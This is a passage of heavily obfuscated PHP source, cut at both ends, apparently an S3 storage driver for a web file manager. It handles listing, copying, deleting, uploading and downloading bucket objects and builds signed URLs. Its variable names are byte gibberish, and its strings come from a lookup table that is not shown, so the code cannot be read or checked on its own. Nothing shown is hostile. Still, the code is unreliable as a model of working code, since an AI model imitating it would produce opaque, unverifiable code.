$˜Í°ı× = $â“±ş . "\x28{$’‚ÖÃ»ê}\51{$å¹¦Ç¿}"; $’‚ÖÃ»ê++; } return $˜Í°ı×; } private function fileNameAutoList($İş­©²ç, $­„”¼™…, $ŒÁÒŠˆŸ = false) { $Ìõéó¯Û =& $_SERVER[”ôÑ§ì¸]; $½¢½  = $this->listPath($İş­©²ç, !0); $½¢½  = array_merge($½¢½ [$Ìõéó¯Û[82]], $½¢½ [$Ìõéó¯Û[83]]); $–ïâ¬–† = array_to_keyvalue($½¢½ , $Ìõéó¯Û[12], $Ìõéó¯Û[32]); $´ä«î¤ = $Ìõéó¯Û[10] . get_path_ext($­„”¼™…); $´ä«î¤ = $´ä«î¤ == $Ìõéó¯Û[10] || $ŒÁÒŠˆŸ ? $Ìõéó¯Û[12] : $´ä«î¤; $–ò…ó·ƒ = substr($­„”¼™…, 0, strlen($­„”¼™…) - strlen($´ä«î¤)); $ùÆØä˜ = $–ò…ó·ƒ . "\x28\x30\51{$´ä«î¤}"; for ($÷ùÍï²Ô = 1; $÷ùÍï²Ô <= count($–ïâ¬–†) + 1; $÷ùÍï²Ô++) { $ùÆØä˜ = $–ò…ó·ƒ . "\x28{$÷ùÍï²Ô}\x29{$´ä«î¤}"; if (!in_array_not_case($ùÆØä˜, $–ïâ¬–†)) { return $ùÆØä˜; } } return $ùÆØä˜; } public function listAllFiles($çóüÎ£, $Èçá˜) { $‚¼À­…¦ =& $_SERVER[”ôÑ§ì¸]; if (empty($Èçá˜)) { return array(); } $ã·Íº = array_keys($Èçá˜); $šıœ®š  = array(); $çóüÎ£ = trim($çóüÎ£, $‚¼À­…¦[8]); foreach ($Èçá˜ as $…ñš±Š => $Ûû­Æûú) { $ ÔåÒ = ltrim(substr(trim($…ñš±Š, $‚¼À­…¦[8]), strlen($çóüÎ£)), $‚¼À­…¦[8]); if (substr($…ñš±Š, -1) == $‚¼À­…¦[8]) { $ ÔåÒ = rtrim($ ÔåÒ, $‚¼À­…¦[8]) . $‚¼À­…¦[8]; } $šıœ®š  = array_merge($šıœ®š , $this->slicePath($ ÔåÒ)); } $¾ñ–ò”Ì = array(); foreach (array_unique($šıœ®š ) as $êÅ îŠ¶) { $à“Ş˜œµ = array($‚¼À­…¦[84] => $this->getPathOuter($‚¼À­…¦[8] . $çóüÎ£ . $‚¼À­…¦[8] . $êÅ îŠ¶), $‚¼À­…¦[75] => 1, $‚¼À­…¦[76] => 0); if (substr($êÅ îŠ¶, -1) != $‚¼À­…¦[8]) { $à“Ş˜œµ[$‚¼À­…¦[75]] = 0; $è£·ññÁ = $this->getPath($çóüÎ£ . $‚¼À­…¦[8] . $êÅ îŠ¶); if (isset($Èçá˜[$è£·ññÁ])) { $†¤–¸Ä = $Èçá˜[$è£·ññÁ]; if (isset($†¤–¸Ä[$‚¼À­…¦[76]])) { $à“Ş˜œµ[$‚¼À­…¦[76]] = intval($†¤–¸Ä[$‚¼À­…¦[76]]); } if (isset($†¤–¸Ä[$‚¼À­…¦[193]])) { $à“Ş˜œµ[$‚¼À­…¦[85]] = intval($†¤–¸Ä[$‚¼À­…¦[193]]); } } } $¾ñ–ò”Ì[] = $à“Ş˜œµ; } return $¾ñ–ò”Ì; } public function slicePath($„ºøÍäı) { $à€êÙ• =& $_SERVER[”ôÑ§ì¸]; $ëØĞö = explode($à€êÙ•[8], trim($„ºøÍäı, $à€êÙ•[8])); $„Ğ£¢Ó« = 0; do { ++$„Ğ£¢Ó«; $óÍ–ºùµ[] = implode($à€êÙ•[8], array_slice($ëØĞö, 0, $„Ğ£¢Ó«)) . $à€êÙ•[8]; } while ($„Ğ£¢Ó« < count($ëØĞö)); $óÍ–ºùµ[count($ëØĞö) - 1] = $„ºøÍäı; return $óÍ–ºùµ; } public function getHost() { $ï‰”âÅÂ =& $_SERVER[”ôÑ§ì¸]; $÷ë­Š–ß = parse_url(trim($this->domain, $ï‰”âÅÂ[8])); $ŸâœÅ˜† = isset($÷ë­Š–ß[$ï‰”âÅÂ[194]]) ? $÷ë­Š–ß[$ï‰”âÅÂ[194]] : http_type(); $¡¿½ïşŠ = isset($÷ë­Š–ß[$ï‰”âÅÂ[195]]) ? $÷ë­Š–ß[$ï‰”âÅÂ[195]] : $÷ë­Š–ß[$ï‰”âÅÂ[84]]; if (isset($÷ë­Š–ß[$ï‰”âÅÂ[196]])) { $¡¿½ïşŠ .= $ï‰”âÅÂ[4] . $÷ë­Š–ß[$ï‰”âÅÂ[196]]; } return $ŸâœÅ˜† . $ï‰”âÅÂ[197] . $¡¿½ïşŠ; } public function pathEncode($ƒ×ı¸”‡) { $å½çÄ† =& $_SERVER[”ôÑ§ì¸]; return str_replace($å½çÄ†[198], $å½çÄ†[8], rawurlencode($ƒ×ı¸”‡)); } } class PathDriverBaseS3 extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $useSSL = false; protected $region = ''; protected $endpoint = ''; protected $bucket = ''; protected $client = null; protected $signVer = "\x76\64"; public $ioUploadServer = "\60"; public $ioFileOutServer = "\60"; public $config = array(); public function __construct($ì´üƒŞÏ) { set_timeout(); require_once SDK_DIR . $_SERVER[”ôÑ§ì¸][199]; parent::__construct(); $this->_init($ì´üƒŞÏ); } public function _init($±Û«¯¯) { $this->config = $±Û«¯¯; foreach ($±Û«¯¯ as $‡±ÍïÇ => $·çµÚ) { if (isset($this->{$‡±ÍïÇ})) { $this->{$‡±ÍïÇ} = $·çµÚ; } } $this->endpoint = $±Û«¯¯[$_SERVER[”ôÑ§ì¸][200]]; $this->client = new S3($this->accessKey, $this->secret, $this->useSSL, $this->endpoint, $this->region); $this->client->setEndpoint($this->getHost()); } public function signatureVersion($ŞÀ›ÊÓë = "\166\64") { $this->signVer = $ŞÀ›ÊÓë; $this->client->setSignatureVersion($ŞÀ›ÊÓë); } public function setBucketCors() { return $this->client->setBucketCors($this->bucket); } public function getBucketCors() { return $this->client->getBucketCors($this->bucket); } public function isBucketCors() { $İ­¨üªâ =& $_SERVER[”ôÑ§ì¸]; $ÁÕÉÌ = $this->getBucketCors(); if (!$ÁÕÉÌ || !is_array($ÁÕÉÌ)) { return !1; } if ($ÁÕÉÌ[$İ­¨üªâ[201]] != $İ­¨üªâ[202] || $ÁÕÉÌ[$İ­¨üªâ[203]] != $İ­¨üªâ[202]) { return !1; } $û²ÕêÇ» = array_map($İ­¨üªâ[204], $ÁÕÉÌ[$İ­¨üªâ[205]]); if (!is_array($û²ÕêÇ»)) { $û²ÕêÇ» = array(); } $Ã¡Ÿë­ = array($İ­¨üªâ[206], $İ­¨üªâ[207], $İ­¨üªâ[208], $İ­¨üªâ[209], $İ­¨üªâ[210]); $–úßŞä = array_diff($Ã¡Ÿë­, $û²ÕêÇ»); return empty($–úßŞä); } public function mkfile($ÙÉ»Ú²«, $Ø…©ûºÁ = '', $½ÖŠ£±‘ = REPEAT_RENAME) { $ä’™Ğé— = $this->setContent($ÙÉ»Ú²«, $Ø…©ûºÁ); if ($ä’™Ğé— !== !1) { return $this->getPathOuter($ÙÉ»Ú²«); } return !1; } public function mkdir($İúæ–å¨, $ŞÁ‘õè = REPEAT_SKIP) { $£¼™‹—ã =& $_SERVER[”ôÑ§ì¸]; if (empty($İúæ–å¨) && $İúæ–å¨ !== $£¼™‹—ã[211]) { return !1; } if ($ŞÁ‘õè && $this->_isFolder($İúæ–å¨)) { return $this->getPathOuter($İúæ–å¨); } $¹ü“í˜ô = $this->setContent($İúæ–å¨, $£¼™‹—ã[12], !0); if ($¹ü“í˜ô !== !1) { return $this->getPathOuter($İúæ–å¨); } return !1; } public function copyFile($…¿Ù², $¦¤Ş¬ª¨, $çê´ƒ† = array()) { $¯³ÂíÁÇ =& $_SERVER[”ôÑ§ì¸]; $ØÄ—öÀ = $this->objectMeta($…¿Ù²); if (!$ØÄ—öÀ) { return !1; } if ($ØÄ—öÀ[$¯³ÂíÁÇ[76]] <= 1024 * 1024 * 200) { $¨àª¹ğ = $this->client->copyObject($this->bucket, $…¿Ù², $this->bucket, $¦¤Ş¬ª¨, $¯³ÂíÁÇ[212], $çê´ƒ†); } else { $¨àª¹ğ = $this->client->multiCopyObject($this->bucket, $…¿Ù², $this->bucket, $¦¤Ş¬ª¨, $çê´ƒ†); } $¨àª¹ğ = $¨àª¹ğ ? $this->getPathOuter($¦¤Ş¬ª¨) : !1; return $¨àª¹ğ; } public function moveFile($÷‰”ô„ˆ, $‘˜º†Ã) { if ($this->copyFile($÷‰”ô„ˆ, $‘˜º†Ã)) { $this->delFile($÷‰”ô„ˆ); return $this->getPathOuter($‘˜º†Ã); } return !1; } public function delFile($àÇ­Â) { return $this->client->deleteObject($this->bucket, $àÇ­Â); } public function delFolder($–ƒƒ—¾ë) { $„Ú£µ²ß =& $_SERVER[”ôÑ§ì¸]; if (!$this->exist($–ƒƒ—¾ë)) { return !0; } $this->listItemCache = !1; $¦”àß˜Õ = $this->fileList($–ƒƒ—¾ë); $this->listItemCache = !0; $ğ­ñ´ÛÌ = trim($–ƒƒ—¾ë, $„Ú£µ²ß[8]) . $„Ú£µ²ß[8]; if (!empty($–ƒƒ—¾ë) && $–ƒƒ—¾ë !== $„Ú£µ²ß[211] && !in_array($ğ­ñ´ÛÌ, $¦”àß˜Õ[$„Ú£µ²ß[82]])) { $¦”àß˜Õ[$„Ú£µ²ß[82]][] = $ğ­ñ´ÛÌ; } $æ•ÂÔ¾ = $this->delByBatch($¦”àß˜Õ[$„Ú£µ²ß[83]]); if (!$æ•ÂÔ¾) { return !1; } $æ•ÂÔ¾ = $this->delByBatch($¦”àß˜Õ[$„Ú£µ²ß[82]]); if (!$æ•ÂÔ¾) { return !1; } return $this->delFile($ğ­ñ´ÛÌ); } private function delByBatch($»üâ†Ãç) { foreach (array_chunk($»üâ†Ãç, 1000) as $¦øªûå©) { $®ƒ…ìàÌ = $this->client->deleteObjects($this->bucket, $¦øªûå©); if (!$®ƒ…ìàÌ) { return !1; } } return !0; } public function rename($¿ü«°, $–åÕÓ‡™) { return $this->renameObject($¿ü«°, $–åÕÓ‡™); } public function listPath($„¾†¼¬, $¼§£«ĞÒ = false) { $´šÙÕã» =& $_SERVER[”ôÑ§ì¸]; $•­Üãó = $this->fileList($„¾†¼¬, $´šÙÕã»[8], !0); foreach ($•­Üãó[$´šÙÕã»[82]] as $›¸¿§ê€ => $–¢—İå…) { $•­Üãó[$´šÙÕã»[82]][$›¸¿§ê€] = $this->folderInfo($–¢—İå…, $¼§£«ĞÒ, $–¢—İå…); } foreach ($•­Üãó[$´šÙÕã»[83]] as $›¸¿§ê€ => $–¢—İå…) { $•­Üãó[$´šÙÕã»[83]][$›¸¿§ê€] = $this->fileInfo($–¢—İå…[$´šÙÕã»[32]], $¼§£«ĞÒ, $–¢—İå…); } return $•­Üãó; } protected function infoChildren($¼Š¾íà, &$éæÏï²˜) { $ÌîÎ•ÅÈ =& $_SERVER[”ôÑ§ì¸]; $©¢¹Ùª = $this->fileList($¼Š¾íà, $ÌîÎ•ÅÈ[12], !0); $éæÏï²˜[$ÌîÎ•ÅÈ[78]] += count($©¢¹Ùª[$ÌîÎ•ÅÈ[82]]); $éæÏï²˜[$ÌîÎ•ÅÈ[77]] += count($©¢¹Ùª[$ÌîÎ•ÅÈ[83]]); foreach ($©¢¹Ùª[$ÌîÎ•ÅÈ[83]] as $’×÷©áç) { if (!$’×÷©áç || !$’×÷©áç[$ÌîÎ•ÅÈ[76]]) { continue; } $éæÏï²˜[$ÌîÎ•ÅÈ[76]] += $’×÷©áç[$ÌîÎ•ÅÈ[76]]; } } private function fileInfo($‹²ğÄÊİ, $á·š˜Ä¼ = false, $´¹¯¸‹ò = array()) { $«—‹íŸ— =& $_SERVER[”ôÑ§ì¸]; $ÔÚ‡Ğğ = array($«—‹íŸ—[32] => $this->pathThis($‹²ğÄÊİ), $«—‹íŸ—[84] => $this->getPathOuter($‹²ğÄÊİ), $«—‹íŸ—[33] => $«—‹íŸ—[213], $«—‹íŸ—[174] => $this->ext($‹²ğÄÊİ), $«—‹íŸ—[76] => isset($´¹¯¸‹ò[$«—‹íŸ—[76]]) ? $´¹¯¸‹ò[$«—‹íŸ—[76]] : 0); if ($á·š˜Ä¼) { return $ÔÚ‡Ğğ; } $ÔÚ‡Ğğ[$«—‹íŸ—[214]] = $ÔÚ‡Ğğ[$«—‹íŸ—[85]] = 0; $ÔÚ‡Ğğ[$«—‹íŸ—[215]] = $ÔÚ‡Ğğ[$«—‹íŸ—[216]] = !0; if (empty($´¹¯¸‹ò)) { $´¹¯¸‹ò = $this->objectMeta($‹²ğÄÊİ); if (!$´¹¯¸‹ò) { return $ÔÚ‡Ğğ; } } if (isset($´¹¯¸‹ò[$«—‹íŸ—[217]]) && $´¹¯¸‹ò[$«—‹íŸ—[217]]) { $ÔÚ‡Ğğ[$«—‹íŸ—[218]] = $´¹¯¸‹ò[$«—‹íŸ—[217]]; } if (isset($´¹¯¸‹ò[$«—‹íŸ—[193]])) { $ÔÚ‡Ğğ[$«—‹íŸ—[85]] = $´¹¯¸‹ò[$«—‹íŸ—[193]]; } if (isset($´¹¯¸‹ò[$«—‹íŸ—[76]])) { $ÔÚ‡Ğğ[$«—‹íŸ—[76]] = $´¹¯¸‹ò[$«—‹íŸ—[76]]; } return $ÔÚ‡Ğğ; } private function folderInfo($’øç®ª, $¬ñ¢äÎŠ = false, $ê¢À°®  = array()) { $’ñÇ“§ =& $_SERVER[”ôÑ§ì¸]; $åíª‹ê¨ = array($’ñÇ“§[32] => $this->pathThis($’øç®ª), $’ñÇ“§[84] => $this->getPathOuter($’ñÇ“§[8] . $’øç®ª), $’ñÇ“§[33] => $’ñÇ“§[75]); if ($¬ñ¢äÎŠ) { return $åíª‹ê¨; } $åíª‹ê¨[$’ñÇ“§[214]] = $åíª‹ê¨[$’ñÇ“§[85]] = 0; $åíª‹ê¨[$’ñÇ“§[215]] = $åíª‹ê¨[$’ñÇ“§[216]] = !0; if ($’øç®ª == $’ñÇ“§[12]) { return $åíª‹ê¨; } if (empty($ê¢À°® )) { $ê¢À°®  = $this->objectMeta(trim($’øç®ª, $’ñÇ“§[8]) . $’ñÇ“§[8]); } if (isset($ê¢À°® [$’ñÇ“§[193]])) { $åíª‹ê¨[$’ñÇ“§[214]] = $ê¢À°® [$’ñÇ“§[193]]; } return $åíª‹ê¨; } private function fileList($ñíèèÏ‚, $àîÈ×Ú = '', $·ó‹şƒš = 0) { $…õ†â„â =& $_SERVER[”ôÑ§ì¸]; $â×½øéÜ = rtrim($ñíèèÏ‚, $…õ†â„â[8]) . $…õ†â„â[8]; $şúÇ‚ª¥ = $this->listObjs($â×½øéÜ, null, null, $àîÈ×Ú); if (!$şúÇ‚ª¥) { return array($…õ†â„â[82] => array(), $…õ†â„â[83] => array()); } $ åÊ¬„à = $÷À€±ª³ = array(); foreach ($şúÇ‚ª¥[$…õ†â„â[219]] as $ëËòş¤») { $îµÔ¥çŒ = $ëËòş¤»[$…õ†â„â[32]]; if ($îµÔ¥çŒ == $â×½øéÜ) { continue; } $Õ¦ÓŠ¸“ = isset($ëËòş¤»[$…õ†â„â[76]]) ? $ëËòş¤»[$…õ†â„â[76]] : 0; $ïé’œš = $Õ¦ÓŠ¸“ == 0 && substr($îµÔ¥çŒ, strlen($îµÔ¥çŒ) - 1, 1) == $…õ†â„â[8] ? !0 : !1; $this->cacheMethodInfoSet($îµÔ¥çŒ, $ïé’œš, $ëËòş¤»); if ($ïé’œš) { $ åÊ¬„à[] = $îµÔ¥çŒ; continue; } $÷À€±ª³[] = $·ó‹şƒš ? $ëËòş¤» : $îµÔ¥çŒ; } foreach ($şúÇ‚ª¥[$…õ†â„â[220]] as $ëËòş¤») { $ åÊ¬„à[] = $ëËòş¤»[$…õ†â„â[32]]; $this->cacheMethodInfoSet($ëËòş¤»[$…õ†â„â[32]], !0); } $this->cacheMethodInfoSet($ñíèèÏ‚, !0); return array($…õ†â„â[82] => $ åÊ¬„à, $…õ†â„â[83] => $÷À€±ª³); } private function listObjs($¤«‘ñÇ¨, $ë–Éî“³ = null, $«ÆĞ’ˆÕ = null, $•«¨åÅ = null) { $¬Ôıø¶À =& $_SERVER[”ôÑ§ì¸]; $¤«‘ñÇ¨ = trim($¤«‘ñÇ¨, $¬Ôıø¶À[8]); $“åóˆü¿ = empty($¤«‘ñÇ¨) && $¤«‘ñÇ¨ !== $¬Ôıø¶À[211] ? $¬Ôıø¶À[12] : $¤«‘ñÇ¨ . $¬Ôıø¶À[8]; return $this->client->getBucket($this->bucket, $“åóˆü¿, $ë–Éî“³, $«ÆĞ’ˆÕ, $•«¨åÅ, !0); } public function has($ë²ë¥õ, $ã‰ç£Î¹ = false, $Áà¦Ëíù = true) { $ÆÇâ£Ãœ =& $_SERVER[”ôÑ§ì¸]; $ë²ë¥õ = trim($ë²ë¥õ, $ÆÇâ£Ãœ[8]); $—½¶èª® = empty($ë²ë¥õ) && $ë²ë¥õ !== $ÆÇâ£Ãœ[211] ? $ÆÇâ£Ãœ[12] : $ë²ë¥õ . $ÆÇâ£Ãœ[8]; $¿à¦ß¸Ø = null; $Æ¶×Î… = 500; $ó¦şäú = $ÆÇâ£Ãœ[8]; $ŒÄ®Ÿåå = $Ğ¯¬£ÄÜ = array(); while (!0) { $‹àâÒËğ = $this->listObjs($ë²ë¥õ, $¿à¦ß¸Ø, $Æ¶×Î…, $ó¦şäú); if (!$‹àâÒËğ) { break; } $¿à¦ß¸Ø = $‹àâÒËğ[$ÆÇâ£Ãœ[221]]; $œÔõÒ¯„ = $‹àâÒËğ[$ÆÇâ£Ãœ[219]]; $ë±˜±ƒè = $‹àâÒËğ[$ÆÇâ£Ãœ[220]]; if (empty($œÔõÒ¯„) && empty($ë±˜±ƒè)) { break; } if (count($œÔõÒ¯„) == 1 && $œÔõÒ¯„[0][$ÆÇâ£Ãœ[32]] == $—½¶èª®) { break; } if ($ã‰ç£Î¹) { if (count($œÔõÒ¯„)) { $œÔõÒ¯„ = array_column($œÔõÒ¯„, $ÆÇâ£Ãœ[32]); $ŒÄ®Ÿåå = array_merge($ŒÄ®Ÿåå, $œÔõÒ¯„); } if (count($ë±˜±ƒè)) { $ë±˜±ƒè = array_column($ë±˜±ƒè, $ÆÇâ£Ãœ[32]); $Ğ¯¬£ÄÜ = array_merge($Ğ¯¬£ÄÜ, $ë±˜±ƒè); } if ($¿à¦ß¸Ø === null) { break; } continue; } if ($Áà¦Ëíù) { if (!empty($œÔõÒ¯„)) { if (count($œÔõÒ¯„) > 1 || isset($œÔõÒ¯„[0][$ÆÇâ£Ãœ[32]]) && $œÔõÒ¯„[0][$ÆÇâ£Ãœ[32]] != $—½¶èª®) { return !0; } } } else { if (!empty($ë±˜±ƒè)) { return !0; } } if ($¿à¦ß¸Ø === null) { break; } } if ($ã‰ç£Î¹) { $ŒÄ®Ÿåå = array_diff($ŒÄ®Ÿåå, array($—½¶èª®)); $ŒÄ®Ÿåå = count(array_unique($ŒÄ®Ÿåå)); $Ğ¯¬£ÄÜ = count(array_unique($Ğ¯¬£ÄÜ)); return array($ÆÇâ£Ãœ[222] => $ŒÄ®Ÿåå, $ÆÇâ£Ãœ[223] => $Ğ¯¬£ÄÜ); } return !1; } public function listAll($‰ƒ†°¡) { $ÛÅ¨ıÅ¿ =& $_SERVER[”ôÑ§ì¸]; $òÉÈÅ©• = $this->fileList($‰ƒ†°¡, $ÛÅ¨ıÅ¿[12], !0); $´îØ…ù = array_to_keyvalue($òÉÈÅ©•[$ÛÅ¨ıÅ¿[83]], $ÛÅ¨ıÅ¿[32]); foreach ($òÉÈÅ©•[$ÛÅ¨ıÅ¿[82]] as $Åà‹§ñÌ) { if (is_string($Åà‹§ñÌ)) { $´îØ…ù[$Åà‹§ñÌ] = array($ÛÅ¨ıÅ¿[76] => 0); } } return $this->listAllFiles($‰ƒ†°¡, $´îØ…ù); } public function canRead($“¸ñ±…€) { $óŒø§ñ– =& $_SERVER[”ôÑ§ì¸]; $¥•‡ÃË¡ = $this->client->getAccessControlPolicy($this->bucket, $“¸ñ±…€); if (!$¥•‡ÃË¡) { return !1; } return in_array($¥•‡ÃË¡, array($óŒø§ñ–[224], $óŒø§ñ–[225], $óŒø§ñ–[226])) ? !0 : !1; } public function canWrite($Ê˜Ñ›Øæ) { $Š¯ûôÈÈ =& $_SERVER[”ôÑ§ì¸]; $¡úÅ×à = $this->client->getAccessControlPolicy($this->bucket, $Ê˜Ñ›Øæ); if (!$¡úÅ×à) { return !1; } return in_array($¡úÅ×à, array($Š¯ûôÈÈ[224], $Š¯ûôÈÈ[225])) ? !0 : !1; } public function getContent($”´Èºë¡) { return $this->client->getObject($this->bucket, $”´Èºë¡); } public function setContent($Òˆ•Û´„, $ÛëÅ‡©¬ = '', $Û¥¼èß = false) { $Şô—Éı¤ =& $_SERVER[”ôÑ§ì¸]; $Òˆ•Û´„ = $Û¥¼èß ? trim($Òˆ•Û´„, $Şô—Éı¤[8]) . $Şô—Éı¤[8] : $Òˆ•Û´„; $¨£©ï¥Š = get_file_mime(get_path_ext($Òˆ•Û´„)); $ƒĞé‚Ç» = $this->client->putObject($ÛëÅ‡©¬, $this->bucket, $Òˆ•Û´„, $Şô—Éı¤[212], array(), $¨£©ï¥Š); if (!$ƒĞé‚Ç») { return !1; } if ($Û¥¼èß) { return !0; } $this->cacheMethod(null, null); $ƒĞé‚Ç» = $this->copyFile($Òˆ•Û´„, $Òˆ•Û´„, array($Şô—Éı¤[227] => $ƒĞé‚Ç»[$Şô—Éı¤[217]])); return $ƒĞé‚Ç» ? !0 : !1; } public function fileSubstr($¯µ›¬Ø, $ãÜø×, $£ ¾‚òÀ) { $úĞ‹ˆÂ½ = $ãÜø× + $£ ¾‚òÀ - 1; return $this->client->getObject($this->bucket, $¯µ›¬Ø, array($_SERVER[”ôÑ§ì¸][228] => "\x62\171\164\x65\x73\75{$ãÜø×}\x2d{$úĞ‹ˆÂ½}")); } public function upload($­ç”ëòè, $ã¹ù÷ô­, $òÛÄ˜ÄÕ = false, $õµÈè…Ä = REPEAT_REPLACE) { $¿»Õá©• =& $_SERVER[”ôÑ§ì¸]; $ÒòŒíÙ¡ = array($¿»Õá©•[227] => @md5_file($ã¹ù÷ô­)); $·¥íı‡ = array($¿»Õá©•[229] => get_file_mime(get_path_ext($­ç”ëòè))); if (IO::size($ã¹ù÷ô­) <= 1024 * 1024 * 200) { $€ˆòœ¬˜ = $this->client->putObjectFile($ã¹ù÷ô­, $this->bucket, $­ç”ëòè, $¿»Õá©•[212], $ÒòŒíÙ¡, $·¥íı‡); return !empty($€ˆòœ¬˜) ? $this->getPathOuter($­ç”ëòè) : !1; } $ºöøÚàÁ = $this->client->multiUploadObject($ã¹ù÷ô­, $this->bucket, trim($­ç”ëòè, $¿»Õá©•[8]), $ÒòŒíÙ¡, $·¥íı‡); return $ºöøÚàÁ ? $this->getPathOuter($­ç”ëòè) : !1; } public function download($µ®Šƒ¼™, $ãªçÃ°ı) { if (!@is_dir($this->pathFather($ãªçÃ°ı)) && !IO::mkdir($this->pathFather($ãªçÃ°ı))) { return !1; } $ÇŠƒÎî = $this->client->getObject($this->bucket, $µ®Šƒ¼™, array(), $ãªçÃ°ı); return $ÇŠƒÎî !== !1 ? $ãªçÃ°ı : !1; } public function link($î’ÂøŠ, $šä€Ù¶ = array()) { $¼Éò˜Ï€ =& $_SERVER[”ôÑ§ì¸]; if ($this->signVer == $¼Éò˜Ï€[230]) { return $this->client->getAuthenticatedURL($this->bucket, $î’ÂøŠ, 3600 * 12, $šä€Ù¶); } return $this->client->getObjectUrl($this->accessKey, $this->secret, $this->bucket, trim($î’ÂøŠ, $¼Éò˜Ï€[8]), 3600 * 12, $this->region, array(), !0, $šä€Ù¶); } public function fileOut($İÏ‘ã“è, $Ğç¥ûãÎ = false, $ô¶¯×æ÷ = false, $Ö¯²ß£ò = '') { $ùÜ–Øñğ =& $_SERVER[”ôÑ§ì¸]; if ($this->isFileOutServer()) { return $this->fileOutServer($İÏ‘ã“è, $Ğç¥ûãÎ, $ô¶¯×æ÷, $Ö¯²ß£ò); } if (!$ô¶¯×æ÷) { $ô¶¯×æ÷ = $this->pathThis($İÏ‘ã“è); } $İ£“º = get_file_mime(get_path_ext($ô¶¯×æ÷)); if ($İ£“º == $ùÜ–Øñğ[231]) { return parent::fileOut($İÏ‘ã“è, $Ğç¥ûãÎ, $ô¶¯×æ÷, $Ö¯²ß£ò); } $ö’¢Â = array($ùÜ–Øñğ[232] => $İ£“º); if ($Ğç¥ûãÎ) { $ö’¢Â[$ùÜ–Øñğ[233]] = $ùÜ–Øñğ[234] . rawurlencode($ô¶¯×æ÷); } else { } $¼ìÛ‹Êê = $this->link($İÏ‘ã“è, $ö’¢Â); $this->fileOutLink($¼ìÛ‹Êê); } public function fileOutServer($ø©š÷, $Ôëšøœë = false, $÷Ş¦»üÀ = false, $««Ô«Ò² = '') { parent::fileOut($ø©š÷, $Ôëšøœë, $÷Ş¦»üÀ, $««Ô«Ò²); } public function fileOutImageServer($èªæ²­ï, $Ó’’ò·ñ = 250) { parent::fileOutImage($èªæ²­ï, $Ó’’ò·ñ); } public function hashMd5($“èƒòÇ, $æ‡ˆµå± = '') { $µãè©Äİ =& $_SERVER[”ôÑ§ì¸]; $ËŞÚÕòÒ = $this->objectMeta($“èƒòÇ); if (!$ËŞÚÕòÒ) { return !1; } $æ‡ˆµå± = $æ‡ˆµå± ? $æ‡ˆµå± : _get($ËŞÚÕòÒ, $µãè©Äİ[235]); $æ‡ˆµå± = $æ‡ˆµå± ? $æ‡ˆµå± : _get($ËŞÚÕòÒ, $µãè©Äİ[217], $µãè©Äİ[12]); return $æ‡ˆµå±; } public function uploadFormData($µë¦Œãæ, $‚úºÏ— = 3600) { $ü¤ÜÌÌ =& $_SERVER[”ôÑ§ì¸]; $Û’ù°§ = $this->pathFather($µë¦Œãæ); $Æšé€ØĞ = $this->client->getHttpUploadPostParams($this->bucket, $Û’ù°§, $ü¤ÜÌÌ[212], $‚úºÏ—); return array_merge((array) $Æšé€ØĞ, array($ü¤ÜÌÌ[195] => $this->getHost())); } public function multiUploadFormData($™ÒÖç·œ, $ïÄ‡ä™Ş = 3600) { $ÈÎ‰ıŸ† =& $_SERVER[”ôÑ§ì¸]; $‰úˆÌŠŸ = gmdate($ÈÎ‰ıŸ†[236]); $«µÚÇ = array(); $Ÿùóò¶ = $this->client->getUploadId($this->bucket, $™ÒÖç·œ, $«µÚÇ); if (!$Ÿùóò¶) { return !1; } return array($ÈÎ‰ıŸ†[237] => $Ÿùóò¶, $ÈÎ‰ıŸ†[195] => $this->getHost() . $ÈÎ‰ıŸ†[8] . $this->pathEncode($™ÒÖç·œ), $ÈÎ‰ıŸ†[238] => $‰úˆÌŠŸ, $ÈÎ‰ıŸ†[94] => $™ÒÖç·œ); } public function multiUploadAuthData($Î§ñâÃş, $ŸÙÛ÷‘ = array()) { $·™ïÕ©™ =& $_SERVER[”ôÑ§ì¸]; $ÀóÀàõ = isset($ŸÙÛ÷‘[$·™ïÕ©™[238]]) ? $ŸÙÛ÷‘[$·™ïÕ©™[238]] : gmdate($·™ïÕ©™[236]); $§™¡‡ÎØ = isset($ŸÙÛ÷‘[$·™ïÕ©™[174]]) ? $ŸÙÛ÷‘[$·™ïÕ©™[174]] : $·™ïÕ©™[12]; $İ™ñ„€² = $ŸÙÛ÷‘[$·™ïÕ©™[94]]; unset($ŸÙÛ÷‘[$·™ïÕ©™[94]]); if (isset($ŸÙÛ÷‘[$·™ïÕ©™[239]])) { $ŸÙÛ÷‘[$·™ïÕ©™[238]] = $ÀóÀàõ; return $this->listUploadParts($İ™ñ„€², $ŸÙÛ÷‘); } $¦áÙš× = array($·™ïÕ©™[240], $·™ïÕ©™[12], $·™ïÕ©™[120], $·™ïÕ©™[12], "\x78\55\141\155\172\55\144\x61\x74\x65\x3a{$ÀóÀàõ}", $·™ïÕ©™[8] . $this->bucket . $·™ïÕ©™[8] . $this->pathEncode($İ™ñ„€²) . $§™¡‡ÎØ); if (strpos($§™¡‡ÎØ, $·™ïÕ©™[241]) === 0) { $¦áÙš×[0] = $·™ïÕ©™[242]; } if (isset($ŸÙÛ÷‘[$·™ïÕ©™[243]]) && $ŸÙÛ÷‘[$·™ïÕ©™[243]] == $·™ïÕ©™[244]) { $¦áÙš×[0] = $·™ïÕ©™[244]; } $Å†õÚëà = implode($·™ïÕ©™[245], $¦áÙš×); $é‹Ü­ØÙ = base64_encode(hash_hmac($·™ïÕ©™[246], $Å†õÚëà, $this->secret, !0)); $Î‰ŞÕÍª = $·™ïÕ©™[247] . $this->accessKey . $·™ïÕ©™[4] . $é‹Ü­ØÙ; if (strpos($§™¡‡ÎØ, $·™ïÕ©™[241]) === 0) { return array($·™ïÕ©™[248] => $Î‰ŞÕÍª, $·™ïÕ©™[238] => $ÀóÀàõ); } return $Î‰ŞÕÍª; } public function listUploadParts($´¥Ïİáê, $í›É˜Üâ = array()) { $¼Ì·š¾¦ =& $_SERVER[”ôÑ§ì¸]; $Âş×”¢ƒ = str_replace($¼Ì·š¾¦[249], $¼Ì·š¾¦[12], $í›É˜Üâ[$¼Ì·š¾¦[174]]); $³ÈÃ¢Ş¢ = $this->client->listParts($this->bucket, $´¥Ïİáê, $Âş×”¢ƒ); if (!$³ÈÃ¢Ş¢) { return !1; } unset($í›É˜Üâ[$¼Ì·š¾¦[239]], $í›É˜Üâ[$¼Ì·š¾¦[243]]); $í›É˜Üâ[$¼Ì·š¾¦[94]] = $´¥Ïİáê; $¥ÎÓ§ö€ = $this->multiUploadAuthData($´¥Ïİáê, $í›É˜Üâ); if (empty($¥ÎÓ§ö€)) { return !1; } return array($¼Ì·š¾¦[248] => 